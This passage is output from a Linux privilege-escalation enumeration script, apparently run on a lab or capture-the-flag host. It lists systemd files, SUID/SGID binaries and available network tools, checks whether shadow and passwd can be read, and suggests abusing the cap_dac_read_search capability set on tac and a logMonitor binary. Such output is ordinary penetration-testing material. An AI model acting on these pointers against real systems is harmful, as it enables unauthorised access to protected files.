-rwxr-xr-x  1 root root  11K Mar 23  2018 systemd-binfmt
-rwxr-xr-x  1 root root  11K Mar 23  2018 systemd-cgroups-agent
-rwxr-xr-x  1 root root  27K Mar 23  2018 systemd-cryptsetup
-rwxr-xr-x  1 root root  19K Mar 23  2018 systemd-fsck
-rwxr-xr-x  1 root root  23K Mar 23  2018 systemd-fsckd
-rwxr-xr-x  1 root root  11K Mar 23  2018 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K Mar 23  2018 systemd-hostnamed
-rwxr-xr-x  1 root root  15K Mar 23  2018 systemd-initctl
-rwxr-xr-x  1 root root 119K Mar 23  2018 systemd-journald
-rwxr-xr-x  1 root root  35K Mar 23  2018 systemd-localed
-rwxr-xr-x  1 root root 203K Mar 23  2018 systemd-logind
-rwxr-xr-x  1 root root  15K Mar 23  2018 systemd-modules-load
-rwxr-xr-x  1 root root 415K Mar 23  2018 systemd-networkd
-rwxr-xr-x  1 root root  19K Mar 23  2018 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K Mar 23  2018 systemd-quotacheck
-rwxr-xr-x  1 root root  11K Mar 23  2018 systemd-random-seed
-rwxr-xr-x  1 root root  15K Mar 23  2018 systemd-remount-fs
-rwxr-xr-x  1 root root  11K Mar 23  2018 systemd-reply-password
-rwxr-xr-x  1 root root 315K Mar 23  2018 systemd-resolved
-rwxr-xr-x  1 root root  19K Mar 23  2018 systemd-rfkill
-rwxr-xr-x  1 root root  39K Mar 23  2018 systemd-shutdown
-rwxr-xr-x  1 root root  15K Mar 23  2018 systemd-sleep
-rwxr-xr-x  1 root root  23K Mar 23  2018 systemd-socket-proxyd
-rwxr-xr-x  1 root root  15K Mar 23  2018 systemd-sysctl
-rwxr-xr-x  1 root root 1.3K Mar 23  2018 systemd-sysv-install
-rwxr-xr-x  1 root root  27K Mar 23  2018 systemd-timedated
-rwxr-xr-x  1 root root  39K Mar 23  2018 systemd-timesyncd
-rwxr-xr-x  1 root root 455K Mar 23  2018 systemd-udevd
-rwxr-xr-x  1 root root  15K Mar 23  2018 systemd-update-utmp
-rwxr-xr-x  1 root root  11K Mar 23  2018 systemd-user-sessions
drwxr-xr-x  2 root root 4.0K Dec  3  2017 system-shutdown

/lib/systemd/system:
total 700K
drwxr-xr-x 2 root root 4.0K May  1  2018 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 sockets.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 getty.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 graphical.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 rescue.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 timers.target.wants
drwxr-xr-x 2 root root 4.0K May  1  2018 rc-local.service.d
drwxr-xr-x 2 root root 4.0K May  1  2018 systemd-resolved.service.d
drwxr-xr-x 2 root root 4.0K May  1  2018 systemd-timesyncd.service.d
-rw-r--r-- 1 root root 1.2K Apr 10  2018 docker.service
-rw-r--r-- 1 root root  197 Apr 10  2018 docker.socket
lrwxrwxrwx 1 root root   14 Mar 23  2018 autovt@.service -> getty@.service
-rw-r--r-- 1 root root  879 Mar 23  2018 basic.target
-rw-r--r-- 1 root root  379 Mar 23  2018 bluetooth.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 bootmisc.service -> /dev/null
-rw-r--r-- 1 root root  358 Mar 23  2018 busnames.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 checkroot.service -> /dev/null
-rw-r--r-- 1 root root  770 Mar 23  2018 console-getty.service
-rw-r--r-- 1 root root  791 Mar 23  2018 container-getty@.service
lrwxrwxrwx 1 root root    9 Mar 23  2018 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 cryptdisks.service -> /dev/null
-rw-r--r-- 1 root root  394 Mar 23  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Mar 23  2018 cryptsetup.target
lrwxrwxrwx 1 root root   13 Mar 23  2018 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Mar 23  2018 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Mar 23  2018 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Mar 23  2018 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Mar 23  2018 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Mar 23  2018 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Mar 23  2018 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1010 Mar 23  2018 debug-shell.service
lrwxrwxrwx 1 root root   16 Mar 23  2018 default.target -> graphical.target
-rw-r--r-- 1 root root  709 Mar 23  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Mar 23  2018 dev-mqueue.mount
-rw-r--r-- 1 root root 1.1K Mar 23  2018 emergency.service
-rw-r--r-- 1 root root  431 Mar 23  2018 emergency.target
-rw-r--r-- 1 root root  501 Mar 23  2018 exit.target
-rw-r--r-- 1 root root  440 Mar 23  2018 final.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 fuse.service -> /dev/null
-rw-r--r-- 1 root root 1.7K Mar 23  2018 getty@.service
-rw-r--r-- 1 root root  342 Mar 23  2018 getty-static.service
-rw-r--r-- 1 root root  460 Mar 23  2018 getty.target
-rw-r--r-- 1 root root  558 Mar 23  2018 graphical.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 halt.service -> /dev/null
-rw-r--r-- 1 root root  487 Mar 23  2018 halt.target
-rw-r--r-- 1 root root  447 Mar 23  2018 hibernate.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  468 Mar 23  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  630 Mar 23  2018 initrd-cleanup.service
-rw-r--r-- 1 root root  553 Mar 23  2018 initrd-fs.target
-rw-r--r-- 1 root root  790 Mar 23  2018 initrd-parse-etc.service
-rw-r--r-- 1 root root  521 Mar 23  2018 initrd-root-device.target
-rw-r--r-- 1 root root  526 Mar 23  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  640 Mar 23  2018 initrd-switch-root.service
-rw-r--r-- 1 root root  714 Mar 23  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  723 Mar 23  2018 initrd.target
-rw-r--r-- 1 root root  664 Mar 23  2018 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  501 Mar 23  2018 kexec.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Mar 23  2018 kmod.service -> systemd-modules-load.service
-rw-r--r-- 1 root root  677 Mar 23  2018 kmod-static-nodes.service
-rw-r--r-- 1 root root  395 Mar 23  2018 local-fs-pre.target
-rw-r--r-- 1 root root  507 Mar 23  2018 local-fs.target
-rw-r--r-- 1 root root  405 Mar 23  2018 machine.slice
lrwxrwxrwx 1 root root   28 Mar 23  2018 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Mar 23  2018 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 mountnfs.service -> /dev/null
-rw-r--r-- 1 root root  492 Mar 23  2018 multi-user.target
-rw-r--r-- 1 root root  464 Mar 23  2018 network-online.target
-rw-r--r-- 1 root root  461 Mar 23  2018 network-pre.target
-rw-r--r-- 1 root root  480 Mar 23  2018 network.target
-rw-r--r-- 1 root root  514 Mar 23  2018 nss-lookup.target
-rw-r--r-- 1 root root  473 Mar 23  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Mar 23  2018 paths.target
-rw-r--r-- 1 root root  552 Mar 23  2018 poweroff.target
-rw-r--r-- 1 root root  377 Mar 23  2018 printer.target
lrwxrwxrwx 1 root root   22 Mar 23  2018 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  693 Mar 23  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Mar 23  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  568 Mar 23  2018 quotaon.service
-rw-r--r-- 1 root root  628 Mar 23  2018 rc-local.service
lrwxrwxrwx 1 root root   16 Mar 23  2018 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Mar 23  2018 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 reboot.service -> /dev/null
-rw-r--r-- 1 root root  543 Mar 23  2018 reboot.target
-rw-r--r-- 1 root root  396 Mar 23  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Mar 23  2018 remote-fs.target
-rw-r--r-- 1 root root 1022 Mar 23  2018 rescue.service
-rw-r--r-- 1 root root  486 Mar 23  2018 rescue.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 rmnologin.service -> /dev/null
-rw-r--r-- 1 root root  500 Mar 23  2018 rpcbind.target
lrwxrwxrwx 1 root root   15 Mar 23  2018 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Mar 23  2018 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Mar 23  2018 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Mar 23  2018 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Mar 23  2018 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Mar 23  2018 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Mar 23  2018 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 sendsigs.service -> /dev/null
-rw-r--r-- 1 root root 1.1K Mar 23  2018 serial-getty@.service
-rw-r--r-- 1 root root  402 Mar 23  2018 shutdown.target
-rw-r--r-- 1 root root  362 Mar 23  2018 sigpwr.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 single.service -> /dev/null
-rw-r--r-- 1 root root  420 Mar 23  2018 sleep.target
-rw-r--r-- 1 root root  409 Mar 23  2018 slices.target
-rw-r--r-- 1 root root  380 Mar 23  2018 smartcard.target
-rw-r--r-- 1 root root  356 Mar 23  2018 sockets.target
-rw-r--r-- 1 root root  380 Mar 23  2018 sound.target
lrwxrwxrwx 1 root root    9 Mar 23  2018 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 stop-bootlogd-single.service -> /dev/null
-rw-r--r-- 1 root root  441 Mar 23  2018 suspend.target
-rw-r--r-- 1 root root  353 Mar 23  2018 swap.target
-rw-r--r-- 1 root root  715 Mar 23  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  518 Mar 23  2018 sysinit.target
-rw-r--r-- 1 root root  719 Mar 23  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Mar 23  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1.3K Mar 23  2018 syslog.socket
-rw-r--r-- 1 root root  664 Mar 23  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  653 Mar 23  2018 systemd-ask-password-console.service
-rw-r--r-- 1 root root  592 Mar 23  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  681 Mar 23  2018 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Mar 23  2018 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Mar 23  2018 systemd-binfmt.service
-rw-r--r-- 1 root root  497 Mar 23  2018 systemd-exit.service
-rw-r--r-- 1 root root  551 Mar 23  2018 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Mar 23  2018 systemd-fsckd.socket
-rw-r--r-- 1 root root  674 Mar 23  2018 systemd-fsck-root.service
-rw-r--r-- 1 root root  675 Mar 23  2018 systemd-fsck@.service
-rw-r--r-- 1 root root  544 Mar 23  2018 systemd-halt.service
-rw-r--r-- 1 root root  631 Mar 23  2018 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Mar 23  2018 systemd-hibernate.service
-rw-r--r-- 1 root root  930 Mar 23  2018 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Mar 23  2018 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Mar 23  2018 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Mar 23  2018 systemd-initctl.service
-rw-r--r-- 1 root root  524 Mar 23  2018 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Mar 23  2018 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Mar 23  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root 1.5K Mar 23  2018 systemd-journald.service
-rw-r--r-- 1 root root  842 Mar 23  2018 systemd-journald.socket
-rw-r--r-- 1 root root  731 Mar 23  2018 systemd-journal-flush.service
-rw-r--r-- 1 root root  557 Mar 23  2018 systemd-kexec.service
-rw-r--r-- 1 root root  911 Mar 23  2018 systemd-localed.service
-rw-r--r-- 1 root root 1.4K Mar 23  2018 systemd-logind.service
-rw-r--r-- 1 root root  693 Mar 23  2018 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Mar 23  2018 systemd-modules-load.service
-rw-r--r-- 1 root root 1.5K Mar 23  2018 systemd-networkd.service
-rw-r--r-- 1 root root  591 Mar 23  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  685 Mar 23  2018 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  553 Mar 23  2018 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Mar 23  2018 systemd-quotacheck.service
-rw-r--r-- 1 root root  752 Mar 23  2018 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Mar 23  2018 systemd-reboot.service
-rw-r--r-- 1 root root  757 Mar 23  2018 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.5K Mar 23  2018 systemd-resolved.service
-rw-r--r-- 1 root root  696 Mar 23  2018 systemd-rfkill.service
-rw-r--r-- 1 root root  617 Mar 23  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  497 Mar 23  2018 systemd-suspend.service
-rw-r--r-- 1 root root  653 Mar 23  2018 systemd-sysctl.service
-rw-r--r-- 1 root root  868 Mar 23  2018 systemd-timedated.service
-rw-r--r-- 1 root root 1.3K Mar 23  2018 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Mar 23  2018 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  450 Mar 23  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  703 Mar 23  2018 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Mar 23  2018 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  595 Mar 23  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Mar 23  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  968 Mar 23  2018 systemd-udevd.service
-rw-r--r-- 1 root root  823 Mar 23  2018 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Mar 23  2018 systemd-udev-trigger.service
-rw-r--r-- 1 root root  757 Mar 23  2018 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Mar 23  2018 systemd-update-utmp.service
-rw-r--r-- 1 root root  588 Mar 23  2018 systemd-user-sessions.service
-rw-r--r-- 1 root root  436 Mar 23  2018 system.slice
-rw-r--r-- 1 root root  585 Mar 23  2018 system-update.target
-rw-r--r-- 1 root root  405 Mar 23  2018 timers.target
-rw-r--r-- 1 root root  395 Mar 23  2018 time-sync.target
lrwxrwxrwx 1 root root   21 Mar 23  2018 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Mar 23  2018 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Mar 23  2018 umountroot.service -> /dev/null
-rw-r--r-- 1 root root  417 Mar 23  2018 umount.target
lrwxrwxrwx 1 root root   27 Mar 23  2018 urandom.service -> systemd-random-seed.service
-rw-r--r-- 1 root root  548 Mar 23  2018 user@.service
-rw-r--r-- 1 root root  392 Mar 23  2018 user.slice
lrwxrwxrwx 1 root root    9 Mar 23  2018 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  366 Mar  2  2018 dbus.service
-rw-r--r-- 1 root root  106 Mar  2  2018 dbus.socket
-rw-r--r-- 1 root root  445 Mar  1  2018 ssh.service
-rw-r--r-- 1 root root  196 Mar  1  2018 ssh@.service
-rw-r--r-- 1 root root  216 Mar  1  2018 ssh.socket
drwxr-xr-x 2 root root 4.0K Dec  3  2017 busnames.target.wants
drwxr-xr-x 2 root root 4.0K Dec  3  2017 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Dec  3  2017 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Dec  3  2017 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Dec  3  2017 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Dec  3  2017 runlevel5.target.wants
-rw-r--r-- 1 root root  306 Oct 14  2017 wpa_supplicant.service
-rw-r--r-- 1 root root  455 Oct 14  2017 wpa_supplicant@.service
-rw-r--r-- 1 root root  251 Oct  7  2017 cron.service
-rw-r--r-- 1 root root  225 Sep 13  2017 apt-daily.service
-rw-r--r-- 1 root root  156 Sep 13  2017 apt-daily.timer
-rw-r--r-- 1 root root  238 Sep 13  2017 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Sep 13  2017 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  420 Sep 13  2017 bluetooth.service
-rw-r--r-- 1 root root  306 Jul 25  2017 open-vm-tools.service
-rw-r--r-- 1 root root  298 Jul 25  2017 vgauth.service
-rw-r--r-- 1 root root  224 May 29  2017 anacron.service
-rw-r--r-- 1 root root  145 May 29  2017 anacron.timer
-rw-r--r-- 1 root root  456 Mar 18  2017 netfilter-persistent.service
-rw-r--r-- 1 root root  290 Jan 18  2017 rsyslog.service
-rw-r--r-- 1 root root  552 Jan 10  2017 ifup@.service
-rw-r--r-- 1 root root  735 Oct 19  2016 networking.service
-rw-r--r-- 1 root root  312 May 19  2016 console-setup.service
-rw-r--r-- 1 root root  287 May 18  2016 keyboard-setup.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Mar 23  2018 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Mar 23  2018 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Mar 23  2018 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Mar 23  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Mar 23  2018 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Mar  2  2018 dbus.service -> ../dbus.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Mar 23  2018 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Mar 23  2018 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Mar 23  2018 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Mar 23  2018 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Mar 23  2018 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Mar 23  2018 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Mar  2  2018 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Mar 23  2018 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Mar 23  2018 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Mar 23  2018 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Mar 23  2018 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Mar 23  2018 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Mar 23  2018 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Mar 23  2018 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Mar 23  2018 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Mar 23  2018 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Mar 23  2018 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Mar 23  2018 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 27 Mar 23  2018 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 Mar 23  2018 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Mar 23  2018 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Mar 23  2018 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Mar 23  2018 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Mar 23  2018 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Mar 23  2018 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Mar 23  2018 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 24 Mar 23  2018 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Mar 23  2018 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 30 Mar 23  2018 systemd-update-utmp.service -> ../systemd-update-utmp.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Mar 23  2018 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Mar 23  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Mar 23  2018 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Mar 23  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Mar 23  2018 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Mar 23  2018 debian.conf

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 551 Mar 23  2018 resolvconf.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Mar 23  2018 disable-with-time-daemon.conf

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Jan 24  2017 hdparm

/lib/systemd/network:
total 16K
-rw-r--r-- 1 root root 605 Mar 23  2018 80-container-host0.network
-rw-r--r-- 1 root root 678 Mar 23  2018 80-container-ve.network
-rw-r--r-- 1 root root 664 Mar 23  2018 80-container-vz.network
-rw-r--r-- 1 root root  80 Mar 23  2018 99-default.link

/lib/systemd/system-generators:
total 192K
-rwxr-xr-x 1 root root 23K Mar 23  2018 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root 15K Mar 23  2018 systemd-debug-generator
-rwxr-xr-x 1 root root 31K Mar 23  2018 systemd-fstab-generator
-rwxr-xr-x 1 root root 15K Mar 23  2018 systemd-getty-generator
-rwxr-xr-x 1 root root 35K Mar 23  2018 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root 11K Mar 23  2018 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root 11K Mar 23  2018 systemd-rc-local-generator
-rwxr-xr-x 1 root root 11K Mar 23  2018 systemd-system-update-generator
-rwxr-xr-x 1 root root 31K Mar 23  2018 systemd-sysv-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 923 Mar 23  2018 90-systemd.preset

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  gcc                           4:6.3.0-4                      amd64        GNU C compiler
ii  gcc-6                         6.3.0-18+deb9u1                amd64        GNU C compiler


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1627 May  3  2018 /etc/passwd
-rw-r--r-- 1 root root 773 May  3  2018 /etc/group
-rw-r--r-- 1 root root 869 May  3  2018 /etc/profile
-rw-r----- 1 root shadow 1218 May  3  2018 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 30800 Jun 23  2016 /bin/fusermount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 440728 Mar  1  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd


[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 440728 Mar  1  2018 /usr/lib/openssh/ssh-keysign


[-] GUID files:
-rwxr-sr-x 1 root tty 14768 Apr 12  2017 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 71856 May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root mail 19008 Jan 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root crontab 40264 Oct  7  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 27448 Mar  7  2018 /usr/bin/wall
-rwxr-sr-x 1 root ssh 358624 Mar  1  2018 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 35592 May 27  2017 /sbin/unix_chkpwd


[+] Possibly interesting GUID files:
-rwxr-sr-x 1 root ssh 358624 Mar  1  2018 /usr/bin/ssh-agent


[+] Files with POSIX capabilities set:
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei


[+] Users with specific POSIX capabilities:
cap_dac_read_search monitor


[+] Capabilities associated with the current user:
cap_dac_read_search


[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei


[+] Permissions of files with the same capabilities associated with the current user:
-rwxr-xr-x 1 root root 39752 Feb 22  2017 /usr/bin/tac
-r-xr-x--- 1 app-dev monitor 13706 May  3  2018 /home/monitor/app-dev/v0.1/logMonitor-0.1


[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda1 during installation
